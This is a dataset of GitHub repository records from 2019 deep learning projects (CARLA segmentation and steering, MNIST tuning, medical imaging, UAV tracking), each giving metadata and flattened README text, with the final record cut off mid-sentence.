chexnet,2019-08-27T13:24:05Z,2019-11-17T19:08:48Z,Python,edupooch,User,1,1,0,4,master,edupooch,1,0,0,0,0,0,0
nikos134,Carla-Semantic-Segmentation,n/a,Carla Semantic Segmentation This repository holds my dissertation project during my time at the University of Bristol titled Deep Learning for Semantic Segmentation Video demonstration of the proposed architecture predicting the semantic segmentation image while driving in Town 3 of Carla Watch the video imgs thumbnail png https youtu be WV4RRIaQjTc Summary Simulator Carla ver 0 9 5 Data preprocessing Created front view image representations of the Lidar Data augment the collected datasets to create the different classes for the Warning Model Data augmentation Random rotations translations blur brightness occlusions Architecture Modified U net custom CNN Datasets Three different datasets were recorded in total The first dataset that was collected consisted of 6 000 frames It was recorded in Town 3 under clear weather conditions In order to improve accuracy and robustness a larger dataset with 30 000 frames was collected The simulation was set to run at 30 FPS however the recording was happening at a much slower rate 2 3 FPS It took roughly four and a half hours to gather the data however the dataset only represents roughly 17 minutes of driving with the ego vehicle The datasets included both the training and validation data for the DNNs Again this dataset was collected in Town 3 but with using all possible weather conditions iterating every 2000 frames Lastly a third dataset was collected consisted of 6 000 frames using six different kinds of weather The dataset was used for testing the different architectures and evaluating the performance of the system Finally the Python Client was redesigned in order to make it possible to run the prediction system in real time without needing to pre record any data It was discovered that it could be beneficiary to create a front view image representation of the Lidar point cloud rather than using the whole point cloud This has a benefit that the system only uses data that are actually needed for the segmentation process Also it was simpler to integrate them with existing image segmentation networks The code for creating the Lidar image is located in the CarlaClient file Ouput Data Augmentation For the warning model in order to create the different classes data augmentation was applied However instead of using data augmentation to improve training performance it was used to create the dataset containing different classes rotation blur occlusion The same dataset which was used for training the image segmentation model was augmented in four different ways The dataset was divided into four equal size parts each containing 25 of the original dataset 7 500 images each The first class contains the original images without applying any modification to them which represent the quality standard that the system expects The second class contains images that rotation or translation was applied to them to simulate the event that the sensor was moved from its place Next blur or random lightness were applied to simulate potential malfunction of the sensor Finally black spots were applied to the images to simulate potential occlusion from an object or due to sensor malfunction Architecture One of the objectives of this project was to develop a DNN architecture that can predict the semantic segmentation map which is required for planning and navigation in autonomous vehicles A modified U net network was used for predicting the segmentation map The network s image input contains both the RGB and Lidar channels 256 x 512 x 6 It was decided to add to the architecture a second DNN that will be detecting quality issues with the RGB camera sensor Issues such as camera rotation blur or brightness and occlusion A custom CNN model was developed for classifying the image quality The input is an RGB image 256 x 512 x 3 imgs Architecture png Results One of the objectives of this study was to evaluate the contribution of sensor fusion in the suggested architecture In order to evaluate the performance of the two networks two different techniques were applied The first is the built in function called evaluate which is provided by the Keras API The second function used is a custom function that measures the mean intersection over union Long Shelhamer and Darrell 2014 RGB U net Dataset Accuracy Dice Coefficient Training 96 91 0 9806 Validation 96 01 0 9762 Evaluation 87 69 0 9485 Weather ID Mean IU CloudyNoon 52 51 WetNoon 59 08 WetCloudyNoon 67 84 MidRainyNoon 53 98 HardRainNoon 50 53 SoftRainNoon 55 05 Sesnor Fusion U net Dataset Accuracy Dice Coefficient Training 97 51 0 9858 Validation 96 61 0 9817 Evaluation 82 52 0 9498 Weather ID Mean IU CloudyNoon 55 01 WetNoon 62 40 WetCloudyNoon 71 47 MidRainyNoon 57 00 HardRainNoon 53 33 SoftRainNoon 57 70 Warning Model Overall the network achieves an accuracy of 99 02 in the evaluation dataset While testing the implementation in the simulator there were no false predictions It is worth mentioning here that in each case the severity of the augmentation was selected randomly Furthermore during the evaluation of the model 59 images out of the 6000 were classified wrongly However it was discovered that the majority of the misclassified images were due to the severity of the augmentation specifically in images where rotation or translation was barley visible or in images where occlusion was minimal Also it was observed that the weather conditions did not affect the networks performance The network was able to detect quality problems with the sensor even in rough weather conditions It is evident that the model has a high performance overall However more work is required in order to improve accuracy when the augmentation is not severe and could have an impact in the performance of other modules Discussion From the results it is clear that this architecture is able to predict a segmentation image that is close to the ground truth and assess the quality of the RGB image The segmentation model was able to achieve a satisfactory accuracy predicting the segmentation image However the main limitation of this network is that the accuracy of the segmentation image drops with rough weather conditions Sensor fusion techniques were used to improve performance and mitigate this Even though performance did improve with sensor fusion still the effects of the rough weather conditions are visible This is evident in the video https youtu be WV4RRIaQjTc recording of the sensor fusion model performing under different weather conditions in Town 1 of Carla The warning model proved to be much easier to develop and train Even though is a custom architecture and no pre trained weights were used the network achieves 99 of accuracy However one concern about the findings of this model was that slightly augmented images are not classified correctly This could indicate that the network is not suitable where tiny corruptions are needed to be detected Taking all the above into consideration is safe to assume that DNNs models can be used for perception systems in AVs However issues like accuracy will always be present but with further research it is possible to minimise them More importantly though the biggest drawback of DNNs is the black box architecture Current methods are not able to verify and validate the robustness of this kind of systems,2019-08-13T10:17:26Z,2019-10-16T15:40:53Z,Python,nikos134,User,1,1,1,15,master,nikos134,1,0,0,0,0,0,0
iamoneart,College-Course-Enrollment-Forecasting-Using--Multivariate-Time-Series-LSTM-Algorithm,n/a,Multivariate Time series LSTM Algorithm for Course Enrollment Forecasting This a deep learning Long Short Term memory multivariate time series algorithm for forecasting students enrollment into courses,2019-09-07T17:37:46Z,2019-09-08T00:46:00Z,Python,iamoneart,User,0,1,0,3,master,iamoneart,1,0,0,0,0,0,0
cclaypool,cnn-adversarial-examples,adversarial-attacks#adversarial-examples#cnn#convolutional-neural-networks#deep-learning#deep-neural-networks#fastai#pytorch,cnn adversarial examples A project exploring the vulnerability of deep learning models and convolutional neural networks CNNs in particular to adversarial examples Final project for CMP110 Introduction to Security at Abertay University,2019-08-12T16:01:23Z,2019-12-11T21:38:40Z,n/a,cclaypool,User,1,1,0,8,master,cclaypool,1,0,0,0,0,0,0
SilviaChen1998,multi-view-extraction-of-3D-lung-nodules,n/a,multi view extraction of 3D lung nodules Partial Implementation of a Paper named Knowledge based Collaborative Deep Learning for Benign Malignant Lung Nodule Classication on Chest CT In order to get more and better features we can extract nine 2D slices not only on the transverse sagittal coronal but also other six diagonal planes respectively where each diagonal plane cuts two opposite faces of the cube in diagonal and has two opposite edges of the cube and four vertices Thus we obtain nine views of slices for each 3D nodule,2019-08-07T16:59:34Z,2019-09-22T07:53:34Z,n/a,SilviaChen1998,User,1,1,0,4,master,SilviaChen1998,1,0,0,0,0,0,0
Nx2018,Computer-Generated-image-detection,n/a,Computer Generated image detection The source code for the paper entitled An Evaluation of Deep Learning based Computer Generated Image Detection Approaches Each folder contains a file called step which has the steps for each code Since the source code of the paper entitled Computer Graphics Identification Combining Convolutional and Recurrent Neural Networks is provided by the author privately we will not upload this part of the source code on this link without obtaining his consent,2019-09-06T01:02:51Z,2019-11-27T06:55:09Z,Jupyter Notebook,Nx2018,User,1,1,0,14,master,Nx2018,1,0,0,0,0,0,0
hnuzhy,CV_DL_Gather,model-compression#multi-person-pose-estimation#single-person-pose-estimation#super-resolution,Pose Estimation Gather research papers related codes if have and reading notes about Single Multiple Person s Pose Estimation Model Compression Collection research papers related codes if have and reading notes about Model Compression It mainly includes Quantization Pruning Knowledge Distillation and Compact Network Design Super Resolution Collection research papers related codes if have and reading notes about Single Image Super Resolution SISR We may not involve in super resolution about multiple images and videos for the time being Reinforcement Learning Collection research papers related codes if have and reading notes about Reinforcement Learning This topic focuses on Deep Reinforcement Learning,2019-08-26T09:41:15Z,2019-10-09T09:16:35Z,Python,hnuzhy,User,2,1,0,130,master,hnuzhy,1,0,0,0,0,0,0
gkkhut,Machine-Learning-Coursera-AndrewNg,n/a,Andrew Ng s Machine Learning course Description Machine learning is the science of getting computers to act without being explicitly programmed In the past decade machine learning has given us self driving cars practical speech recognition effective web search and a vastly improved understanding of the human genome Machine learning is so pervasive today that you probably use it dozens of times a day without knowing it Many researchers also think it is the best way to make progress towards human level AI In this class you will learn about the most effective machine learning techniques and gain practice implementing them and getting them to work for yourself More importantly you ll learn about not only the theoretical underpinnings of learning but also gain the practical know how needed to quickly and powerfully apply these techniques to new problems Finally you ll learn about some of Silicon Valley s best practices in innovation as it pertains to machine learning and AI This course provides a broad introduction to machine learning datamining and statistical pattern recognition Topics include i Supervised learning parametric non parametric algorithms support vector machines kernels neural networks ii Unsupervised learning clustering dimensionality reduction recommender systems deep learning iii Best practices in machine learning bias variance theory innovation process in machine learning and AI The course will also draw from numerous case studies and applications so that you ll also learn how to apply learning algorithms to building smart robots perception control text understanding web search anti spam computer vision medical informatics audio database mining and other areas,2019-09-01T06:08:24Z,2019-09-07T20:23:03Z,MATLAB,gkkhut,User,1,1,0,5,master,gkkhut,1,0,0,0,0,0,0
MinZeng1990,DMFLDA2,n/a,DMFLDA2 It is a deep learning framework to enhance traditional matrix factorization methods for predicting lncRNA disease associations by integrating linear and non linear features Requirements tensorflow 1 3 0 numpy 1 11 2 scikit learn 0 18 scipy 0 18 1 Usage In this GitHub project we give a demo to show how DMFLDA works In dataprocessing folder we give following datasets we used in our study 1 ldainterMatrix mat is the raw lncRNA disease interaction matrix with matlab format Its shape is 577 lncRNAs x 272 diseases 2 matrix npy is the lncRNA disease interaction matrix with numpy format 3 data pkl is used to store the sampled positive and negative samples 4 ufeature npy is the U matrix of SVD technique used in our study its shape is 577x64 5 vfeature npy is the V matrix of SVD technique used in our study its shape is 272x64 In our demo we provide a leave one out cross validation to evaluate our model You can use crossvalidation py to see experimental results and predict lncRNA related diseases If you want to tune some hyper parameters you can change some values of hyper parameters in hyperparams py The other details can see the paper and the codes Citation License This project is licensed under the MIT License see the LICENSE txt file for details,2019-08-11T02:12:57Z,2019-09-10T03:03:05Z,Python,MinZeng1990,User,1,1,0,9,master,MinZeng1990,1,0,0,0,0,0,0
flomllr,PointNet_CARLA,n/a,Hands on Deep Learning Project Extending PointNet Subtask control Table of contents Table of contents table of contents 1 Introduction 1 introduction 2 Pretrained models and testing visualizations 2 pretrained models and testing visualizations 3 Installing required packages 3 installing required packages 4 Running the CARLA server 4 running the carla server 5 Generating a dataset using the CARLA driving simulator 5 generating a dataset using the carla driving simulator 6 Preprocessing the dataset optional 6 preprocessing the dataset optional Extracting road edges and lines from a dense point cloud extracting road edges and lines from a dense point cloud 7 Training PointNet 7 training pointnet Dataset dataset Training script training script Examples examples 8 Offline testing and visualizing 8 offline testing and visualizing Example example 9 Testing the trained model in the CARLA driving simulator 9 testing the trained model in the carla driving simulator Examples examples 1 Setting the steering indicator during testing setting the steering indicator during testing Visualizing test runs in the simulator visualizing test runs in the simulator Example example 1 Automated testing automated testing 10 Training IIC model for unsupervised segmentation 10 training iic model for unsupervised segmentation Setting up the environment setting up the environment Preparing the dataset preparing the dataset Training the unsupervised segmentation model training the unsupervised segmentation model Visualize the segmentation predicted by the trained IIC model visualize the segmentation predicted by the trained iic model Preprocessing point clouds using the trained IIC model preprocessing point clouds using the trained iic model Rename files to create a valid PointNet dataset rename files to create a valid pointnet dataset 1 Introduction The goal of this project was to control a car in the CARLA driving simulator using a deep learning model trained on point clouds This repository contains PointNet a modified version of the PointNet PyTorch implementation by Fei Xia https github com fxia22 pointnet pytorch Pretrained models for dense point clouds and for LiDAR point clouds scripts to automatically generate training data using the CARLA driving simulator http carla org scripts to preprocess point clouds using a segmentation image scripts to train and evaluate the PointNet model scripts to test a trained model in the CARLA driving simulator http carla org scripts to visualize test runs in the simulator using GIFs IIC Invariant Information clustering model for unsupervised segmentation of images implementation by Xu Ji https github com xu ji IIC 2 Pretrained models and testing visualizations Pretrained PointNet models can be found in trainedmodels PointNet There is one LiDAR model two dense point cloud models one trained with two steering indicators and one trained with three steering indicators and one model trained on point clouds filtered using the predicted segmentation of a trained IIC model 10 training iic model for unsupervised segmentation Pretrained IIC models can be found in trainedmodels IIC 3 Installing required packages pip install r requirements txt 4 Running the CARLA server Before being able to generate a dataset or test a model in the simulator you must make sure a CARLA server is running Please install CARLA 0 8 2 according to the official documentation https github com carla simulator carla releases tag 0 8 2 After CARLA is installed run the following script to start the CARLA server bash python onlinecarla runcarlaserver py carla dir path to your CARLA0 8 2 5 Generating a dataset using the CARLA driving simulator Make sure that the CARLA server is running in one terminal window Then run the following script to generate a custom dataset using the CARLA simulator The data will be saved in onlinecarla out bash python onlinecarla generatedata py capture Available command line arguments Argument Type Description positions int List of positions on CARLA map at which datageneration should start levelsofrandomness float Levels of randomness added to the autopilot steering each in a separate episode frames int Length of the simulation in frames corresponding to each level of randomness Number of arguments must be equal or greater than number of arguments for levelsofrandomness capture storetrue Without this flag the data won t be saved Useful for dry run Without pointcloud or lidar flag only driving data and rgb images will be saved pointcloud storetrue Save dense point clouds preprocessed to only contain points of road edges and road lines lidar storetrue Save LiDAR point clouds forceleftandright storetrue This flag causes two episodes for each position to be rendered one where the car turns left and one where it turns right useful for T junctions ignoreredlights storetrue This flags fixes the throttle at 0 5 and disables all breaks usefil to ignore red lights Example bash python onlinecarla generatedata py positions 65 78 levelsofrandomness 0 1 0 2 0 3 frames 200 200 200 capture pointcloud ignore red lights This example call would lead to a generation of 6 episodes of point clouds 2 positions with each 3 levels of randomness each containing 200 frames If no position levelorrandomness frame argument is provided the script falls back to the following values which can be changed in the code python positions args positions or 65 78 49 50 2 5 10 7 23 40 20 61 levelsofrandomness args randomness or 0 0 0 2 0 4 0 6 framesperlevel args frames or 200 200 200 200 200 200 200 200 200 200 200 6 Preprocessing the dataset optional Extracting road edges and lines from a dense point cloud Note when using the provided generatedata py script to generate the point cloud dataset you can skip this step since the point clouds will already be preprocessed by the data generation script and only contain points of road edges and road lines The following script extracts point clouds containing only points of road edges and road lines from a dataset of dense point clouds and segmentation images bash python roadedgeprojection py datapath path to dataset out path to output dir numepisodes 10 The script expects the dataset to be processed to have the following structure episode000 CameraSemSeg0 image00000 png image00001 png CameraDepth0 image00000 png image00001 png episode001 oIf the numepisodes argument is not provided the script expects the datapath argument to be the root of an episode The generated point clouds are saved in the directory specified with the out argument It will have the following structure out episode000 pointcloud00000 ply pointcloud00001 ply episode001 7 Training PointNet Dataset The training script expects the dataset to have one of the following three structures 1 Plain steering dataset drivingdata csv pointclouds pointcloud00000 ply pointcloud00001 ply 2 Multiple episodes steeringepisodes dataset episode000 episode001 3 Nested steeringnested this is the format the dataset will have when generated using the provided data generation script dataset pos102 Format posPOSITIONoptional left right randomness0 Format irrelevant pointclouds drivingdata csv pointcloud00000 ply pointcloud00001 ply randomness0 1 pos42 4 Combined steeringcombined Multiple steeringnested or steeringepisodes datasets The root directories of the individual datasets must be set directly in the script python trainsteering py line 106 datasets usr prakt s0050 PointCloudProcessed lidartown02 2 usr prakt s0050 PointCloudProcessed lidartown01 2 The individual datasets are provided using a tuple with the first element representing the root directory and the second element the levels of nesting 1 corresponds to a steeringepisodes dataset 2 corresponds to a steeringnested dataset 3 could be a directory containing multiple steeringnested datasets The type of dataset can be set with the datasettype argument Training script Before starting the training script make sure that a visdom https github com facebookresearch visdom server is running in order to receive training plots If you don t want to use visdom to plot the training progress provide the novisdom flag bash python pointnet pytorch utils trainsteering py Available command line arguments Argument Type Description Default value batchsize int Batch size 64 numpoints int Number of points to be sampled from each point cloud 1000 nepoch int Number of epochs 150 outf str Output folder for the trained model The basename will be used for Visdom as well cls model str optional Path to a pth file from which the training will continue dataset str Path to the root directory of the dataset datasettype str Type of provided dataset see previous section for details steering featuretransform storetrue If flag is set the feature transform network will be included in the training onlyleft storetrue If flag is set the balanced weighted sampler will only return examples from straight or left steering situations sampler str Which sampler to use Options balanced weighted default weighted usewholedataset storetrue If this flag is set the whole provided dataset will be used for training Otherwise 80 will be used for training and 20 for testing steeringindicator storetrue If this flag is set a steering indicator will be included during training which tells the model in which direction to steer when there are multiple possible paths recommended numsteeringindicators int Number of steering indicators to be used during training 2 left right 3 left straight right runningmean int Size of a running mean to be applied on the steering values not recommended dataaugmentation storetrue If this flag is set the training data will be augmented using random noise and random rotations not recommended 2 Examples Training with nested dataset python pointnet pytorch utils trainsteering py batchsize 64 numpoints 1000 dataset usr prakt s0050 PointCloudProcessed t junctions datasettype steeringnested outf cls steeringnested sampler weighted nepoch 150 steeringindicator usewholedataset featuretransform Training with combined dataset python pointnet pytorch utils trainsteering py sampler weighted datasettype steeringcombined outf cls steeringcombined usewholedataset batchsize 32 numpoints 2500 nepoch 200 featuretransform 8 Offline testing and visualizing Predictions on a provided example set can be visualized using visdom by calling the following script A carla server must be running before calling the script python pointnet pytorch utils testmodel py Available command line arguments Argument Type Description numpoints int Number of points to be sampled from each point cloud featuretransform storetrue If flag is set the feature transform network will be included during testing model str Model path pth file dataset str Path of the dataset datasettype str Type of dataset Currently only support for steering and steeringepisodes datasets is implemented See Dataset dataset section for more details visdom str Name for visdom plots runningmean int Size of the running mean applied to ground truth steering values not recommended steeringindicator storetrue If this flag is set a steering indicator will be included during training which tells the model in which direction to steer when there are multiple possible paths recommended numsteeringindicators int Number of steering indicators to be used during training 2 left right 3 left straight right dataaugmentation storetrue Set this flag if data augmentation was used during training if dataaugmentation flag was set for training Example python pointnet pytorch utils testmodel py numpoints 25000 featuretransform model trainedmodels PointNet iic3naturalturns pth dataset usr prakt s0050 PointCloudProcessed iic datasettype steeringepisodes numepisodes 1 batchsize 1 visdom iic 9 Testing the trained model in the CARLA driving simulator Before testing a trained PointNet model in the CARLA simulator environment make sure that a CARLA server is running Refer to serction Running the CARLA server 3 running the carla server A CARLA client executing the trained model can be started using the following script python onlinecarla pointnetpilot py Available command line arguments Argument Type Description Default value model str Path to the pth file of the trained model which will be used to predict the steering values featuretransform storetrue If this flag is set the feature transform network will be included in the model This must be set accoring to the settings during training the model usesteeringindicator storetrue If this flag is set a steering indicator is given to the model during testing This flag must be set accoring to the settings during training position int Starting position of the simulation steeringindicator str Fix the steering indicator to a specific value Options left right frames int Length of the simulation in frames capture storetrue If this flag is set the point clouds used for predicting the steering angle will be saved to capture This flag must be set to be able to visualize the test run 9 visualizing test runs in the simulator afterwards keycontrol storetrue If this flag is set it is possible to dynamically set the steering indicator during the simulation using the keyboard setting the steering indicator during testing ignoreredlights storetrue If this flag is set the car will ignore red lights by fixing throttle to 0 5 and disabling the breaks lidar storetrue If this flag is set LiDAR point clouds will be generated and passed to the model instead of preprocessed dense point clouds lidarpps int This flag specifies the points per second sampled by the LiDAR sensor if the lidar flag is set 100 000 lidarfov int Field of view of the LiDAR sensor Options 360 180 Examples Testing the pre trained point cloud model python onlinecarla pointnetpilot py model trainedmodels PointNet pointcloudthreeindicators pth featuretransform usesteeringindicator position 1 frames 300 keycontrol ignoreredlights Testing the pre trained lidar model python onlinecarla pointnetpilot py model trainedmodels PointNet lidar180fov pth featuretransform usesteeringindicator position 1 frames 300 keycontrol ignoreredlights lidar lidarfov 180 Testing the IIC model python onlinecarla pointnetpilot py model trainedmodels PointNet iic3natualturns pth featuretransform usesteeringindicator position 1 frames 300 keycontrol ignoreredlights iic iicnetname latest iicmodel usr prakt s0050 ss19extendingpointnet trainedmodels IIC 3 Setting the steering indicator during testing To set the steering indicator during testing set the keycontrol flag when calling the pointnetpilot py script Note that the focus must remain on the terminal window not the simulation window for the key control to work Key settings a left 10 d right 01 s straight 00 Visualizing test runs in the simulator After capturing a test run by setting the capture flag the point clouds and RGB images can be converted to two synchronous GIFs in order to see what the model saw python visualizerun py Availabl,2019-09-17T20:02:00Z,2019-12-03T12:39:42Z,Python,flomllr,User,1,1,0,5,master,flomllr,1,0,0,0,0,0,0
norahsakal,codercruise-2019-shades,n/a,Guide to your own artificial intelligence app in 3 steps 1 Clone repo and install requirements from requirements txt git clone https github com norahsakal codercruise 2019 shades git pip install r requirements txt 2 Train a model Use the Jupyter notebook trainyourmodel ipynb to train a model 2 1 Place images in folder structure according to following structure data train class img001 jpg img002 jpg class img001 jpg img002 jpg validation class img001 jpg img002 jpg class img001 jpg img002 jpg 2 2 Enter the batch size in base 2 batchsize 2 3 Enter the number of classes according to the number of image classes you are using classes 2 4 Decide on which image size to train on imagesizeheight imagesizewidth 2 5 Enter the number of training and validation samples according to your dataset numberofimagestraining numberofimagesvalidation 2 6 Save model and architecture modeljson model tojson with open model json w as jsonfile jsonfile write modeljson model saveweights yourmodel h5 2 7 Evaluate the model by predicting on a new unseen image prediction loadedmodel predict imgforprediction 3 Set up backend in app py with the trained model from saved model json 3 1 Define classes according to the classes you are using classes ourclassname1 0 ourclassname2 1 ourclassname3 2 3 2 Define same image size as network is trained on imagesize 5 Run the backend for predicitions python app py 4 Run frontend cd frontend npm install npm start 4 1 Visit http localhost 3000 to test the newly trained model by uploading an image,2019-08-22T00:52:02Z,2019-08-22T21:23:17Z,Jupyter Notebook,norahsakal,User,1,1,0,6,master,norahsakal,1,0,0,1,0,2,0
m-peker,Detection-of-Parkinson-s-disease-with-the-images-of-Spiral-Wave-using-fast.ai,n/a,Detection of Parkinson s disease with the images of Spiral Wave test using fast ai The diagnosis of Parkinson s disease in hand drawn images of spirals and waves with fast ai and deep learning techniques Keyword Detection of Parkinson s Disease Deep Learning Techniques fast ai library Google Colab,2019-08-22T00:15:06Z,2019-09-15T16:46:56Z,Jupyter Notebook,m-peker,User,1,1,2,13,master,m-peker,1,0,0,0,0,0,0
jingliinpurdue,Fast-and-Robust-UAV-to-UAV-Detection-and-Tracking,n/a,Fast and Robust UAV to UAV Detection and Tracking This repository contains the code in Keras for Fast and Robust UAV to UAV Detection and Tracking by Jing Li Citation inproceedingsli2016multi title Multi target detection and tracking from a single camera in Unmanned Aerial Vehicles UAVs author Li Jing and Ye Dong Hye and Chung Timothy and Kolsch Mathias and Wachs Juan and Bouman Charles booktitle 2016 IEEE RSJ International Conference on Intelligent Robots and Systems IROS pages 4992 4997 year 2016 organization IEEE Content 1 Requirements 2 Usage 3 Results 4 Contacts Requirements anaconda CUDA 10 0 CUDA Driver Version 430 Usage run demo sh to test the example video Results Saved under ExperimentResults folder txt file with detected bounding boxes videos with groundtruth and detection results Contacts lijinginxjtu gmail com Any discussions or concerns are welcomed,2019-08-22T21:03:03Z,2019-08-26T18:38:33Z,Python,jingliinpurdue,User,1,1,1,44,master,jingliinpurdue,1,0,0,0,0,0,0
ms8909,autoTBdataPrep,n/a,autoTBdataPrep First Automated Data Preparation library powered by Deep Learning to automatically clean and prepare TBs of data on clusters at scale Steps 1 Encode categorical variable,2019-09-11T18:53:31Z,2019-11-17T16:16:53Z,Python,ms8909,User,2,1,0,108,master,tawabshakeel#ms8909,2,0,0,3,2,0,16
mingyr,eeg-dqn,n/a,eeg dqn The repo contains the code for the paper EEG based Drowsiness Estimation for Safety Driving using Deep Q Learning,2019-08-17T12:38:26Z,2019-09-16T10:24:29Z,n/a,mingyr,User,1,1,0,2,master,mingyr,1,0,0,0,0,0,0
axie123,NetView,n/a,NetView NetView is a type of Machine Learning UI that I have been working on to allow beginning data scientists engineers and researchers to deploy and analyze deep learning models with more ease I have three versions of the interface v1 0 v1 5 and v2 0 v1 5 is an improved version of v1 0 with a few more functions v2 0 hasn t changed in functionality but a UI was attempted to integrate everything This was done via PyQt5 However we only got the program to train on the neural network This is because the button calls can only run NoneType functions which means we can t get any return values Also we can only run one command since that other functions can t be run after the first one since PyQt5 executes directly from the app Hopefully we can get more practice or a better UI library in the future,2019-08-09T04:25:18Z,2019-09-11T06:31:04Z,Jupyter Notebook,axie123,User,1,1,0,9,master,axie123,1,0,0,0,0,0,0
ketencimert,Recommender_System,n/a,Recommender System A semi supervised recommender system to find similar companies by building a vectorized knowledge base using company description texts with NFM and deep learning The model aims to map tfidf vector into company matrix using deep learning,2019-08-28T14:57:33Z,2019-09-21T23:07:29Z,Jupyter Notebook,ketencimert,User,1,1,0,9,master,ketencimert,1,0,0,0,0,0,1
arnaghosh,ConceptSpaceGridCells,n/a,Grid Cells in Concept Space A deep learning perspective This is a repository for experiments pertaining to the identification of grid cells in deep networks while learning a concept space Aim To observe if grid cell formation occurs when a network is trying to learn a concept space Experiment Train a deep network on the MNIST dataset and observe place and grid cell property in final and pre final layers respectively Deep Learning Library Pytorch 1 1 0 Todo X Train a simple deep convolutional network on MNIST to identify digits trainmnist py X Obtain final and pre final layer neuron activations for MNIST testset images generateactivations py X Obtain a tSNE representation of the MNIST dataset testset MNISTtsne png X Observe the activity pattern of final layer neurons ensure if it is similar to place cell like behavior in digit space Finallayerplacecellactivations png X Observe the activity pattern of pre final layer neurons ensure if it is similar to grid cell like behavior in digit space Check the results folder not grid like activity Important notes and hyperparameter considerations Network architecture Conv ReLU 1 10 kernelSize 5 MaxPool 2 Conv ReLU 10 20 kernelSize 5 Dropout2D 0 5 MaxPool 2 FC ReLU 320 50 Dropout 0 5 FC 50 10 LogSoftMax Learning Rate 0 001 Optimizer Adam Epochs 10 Batch Size Training 128 Validation 1000 Validation accuracy 98 79 TSNE Done from Python prompt with np random seed 13 without doing PCA Scatterplot using seaborn as shown here https towardsdatascience com visualising high dimensional datasets using pca and t sne in python 8ef87e7915b,2019-09-05T21:21:33Z,2019-09-11T07:24:44Z,Python,arnaghosh,User,1,1,0,23,master,arnaghosh,1,0,0,0,0,0,0
yoni2k,data-science-ml-dl-mnist,data-science#deep-learning#machine-learning#python#tensorflow,MNIST with Deep Learning Goal Find a good model to learn a well known Mnist dataset of hand written numbers Details try many models with many different hyperparameters to be able to find the best model Result Found a model with Train and Validate accuracy of 99 99 and Test accuracy 99 85 Inputs Each image is 28x28 pixels or 784 pixels Each pixel is greyscale 0 black to 255 white 4 layers best model Batch size 450 Hidden funcs relu relu Hidden width 450 4 layers second best Batch size 200 Hidden funcs tanh relu Hidden width 200 5 layers best model Batch size 450 Hidden funcs tanh relu tanh Hidden width 450 5 layers second best Batch size 300 Hidden funcs relu tanh sigmoid Hidden width 300 Details of steps of investigation See DETAILED STEPS md for all steps and trials taken in quest to find the best model Hyperparameters List Num Loops per model number of loops to do per model to see if the same hyperparameters give consitent outputs Validate loss improvement delta what s considered an improvement of valloss Loss of Validate set for EarlyStopping If this improvement is not reached after Validate loss improvement patience epochs below the model is stopped Validate loss improvement patience number of epochs EarlyStopping waits for improvement before stopping Restore best weights whether EarlyStopping takes the best weights seen previously when valloss was minimal or just take the last weights Max num epochs in addition to EarlyStopping whether to stop after a number of Epochs Because of the nature of the model and greatly different number of epochs needed depending on many other hyperparameters used EarlyStopping to stop and put a very big number here 1000 not to have an effect Batch size size of batching while learning Num layers total number of layers including input and output layers Hidden funcs Activation functions of hidden layers Try to put each function in the list in each one of the hidden layers Input layer doesn t have an activation function and output layer always set to softmax due to nature of the problem that we want percentages as output Hidden width width of hidden layers Learning rate Learning rate of the model Shuffle seed since shuffling is done on the set before training and we want to compare apples and apples allow giving explicit seed to get more consistent results for comparison Categories That effect the model itself Num layers Hidden width Batch size Hidden funcs That effect how the model is trained Validate loss improvement delta Validate loss improvement patience Restore best weights Learning rate Outputs see output folder with folders of outputs for each one of the steps of the investigation For detailed conclusions about each one of the steps see DETAILED STEPS md Output from trying various models hyperparams xlsx inputs hyperparameters used for the run either set for all models or all options for different models of this run full xlsx full results with all the inputs and outputs for each one of the models in the current run Inputs see hyperparameters Outputs Test Accuracy Test Loss Train Time total time took for this specific model Test Loss Time Test Loss Efficiency product of Test Loss and Train time if 2 models give similar Test Loss but one much quicker it will get a higher score here Last Validate Accuracy this and following 3 parameters are results of the last epoch but weights are usually taken from best epoch Last Validate Loss Last Train Accuracy Last Train Loss Num epochs that were actually done before the StopFunction stopped the mode Average epoch time time per epoch best xlsx best models from the current run based on the following parameters Best largest Test Accuracy Best smallest Test Loss Best smallest Test Loss Efficiency General conclusions gotchas In order to find the best model the hyperparameters that don t affect the model but how it s learning should be best That is very tricky since a lot of parameters depend on each other and it s hard to find a value that will work in all different cases Therefore I abandoned the maximum number of epochs early in the process since depending on other hyperparameters drastically Started using EarlyStopping on valloss Played with different configurations delta patience and restore best weights The challenge is not to abort too early but also not to continue needlessly Best values found were patience 10 delta 0 0001 for valloss and return to best seen weights Using larger delta causes early abandonment smaller needless continuation Using small patiences causes early abandonment larger needed continuation Not going back to best weights caused stopping the model in a bad state and getting worse values Using stopping with valaccuracy wasn t good since reached 1 0000 accuracy fast Learning rate higher than default 0 001 usually gave worse results the minimum was missed and lower took longer and didn t give better results often worse Seems that there is no issue so much of overfitting didn t see that allowing the model to run for more epochs causes overfitting Running less caused worse results Running more usually means more time and at some point it doesn t help but didn t see overfitting Actual model settings Number of layers Seems that 5 layers gives very slightly better results than 4 layers but not by much 0001 0002 test accuracy but takes slightly longer and less predictable more fluctuation 3 layers had worst results in the beginning of research didn t recheck later Possibly need rechecking 6 layers didn t have better results in the beginning of research and much longer to run also many more possibilities of activation functions Since 4 and 5 behave close pretty safe to assume 6 is not much better Possibly needs double checking Batch size range of better batch sizes is very large some give better accuracies with smaller and some with larger batch sizes Perhaps the reason for large batch size giving worse numbers is because EarlyStopping stops too early No conclusion what s better usually range of 200 500 gave better results Width at least 100 200 Usually 300 500 gave better results Going all the way to 784 number of inputs didn t necessary give better results Activation functions softmax usually didn t help gave one of the better results very rarely and when that happened putting a different function instead usually gave similar results sigmoid sometimes was good as the last hidden layer function But sometimes slow and not extremely stable in results relu and tanh are the best in different places Most models are combinations of these 2 or 1 of them in different places didn t see that one of them needs to be earlier later in the model The initial assumption that need as many different functions didn t prove to be correct some of the best solutions had the same function repeated twice or even 3 times Notes about outputs ways to check how good the model is It s not very hard given time and decent model and enough epochs to reach Validate and Train accuracies of 1 0000 However there is a gap that I don t know to explain between accuracies of training validate and test accuracy It s not surprizing for training accuracy since it could be explained by overfitting that causes accuracy of training to be higher but it s not clear at all why testing and validate are so different Comments about main outputs Test Accuracy main parameter looked at best models were around 0 984 986 Not extemely stable same hyperparameters on different machines runs cause differences of 001 002 of even greater Test Loss lowest got to was 006 0 007 Lower loss usually goes together with higher accuracy but the relationship is not completely linear Sometimes 2 model 1 have higher accuracy and 2nd lower loss Train Time varies greatly between different hyperparameters but even runs of same hyperparameters Test Loss Time Test Loss Efficiency needs to be compared on similar machine in similar conclusions Not useful for comparison between PC and AWS runs Other outputs Last Validate Accuracy some of best models reach 